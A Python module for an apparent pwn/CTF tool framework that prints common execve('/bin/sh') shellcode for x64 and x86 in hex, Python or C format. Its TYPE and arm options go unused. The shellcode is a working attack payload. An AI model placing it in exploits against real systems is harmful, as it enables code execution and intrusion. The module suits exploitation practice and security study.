from core.base_tool import BaseTool, register_tool
from core.exceptions import ExecutionError

@register_tool
class ShellcodeViewer(BaseTool):
    name = 'shellcode_viewer'
    category = 'pwn'
    description = 'Common shellcode reference'
    tags = ['pwn', 'shellcode']

    def _setup_options(self):
        self.add_option('ARCH', 'Architecture (x86/x64/arm)', required=False, default='x64')
        self.add_option('TYPE', 'Type (execve/reverse/bind)', required=False, default='execve')
        self.add_option('FORMAT', 'Format (hex/python/c)', required=False, default='python')

    def run(self) -> dict:
        arch = self.get_option('ARCH')
        fmt = self.get_option('FORMAT')
        
        # Simplified shellcode dictionary
        shellcodes = {
            'x64': b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
            'x86': b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
        }
        
        sc = shellcodes.get(arch, shellcodes['x64'])
        
        if fmt == 'hex':
            out = sc.hex()
        elif fmt == 'c':
            out = '{ ' + ', '.join([f'0x{b:02x}' for b in sc]) + ' };'
        else:
            out = str(sc)
            
        return {'status': 'success', 'result': {'shellcode': out, 'length': len(sc)}}
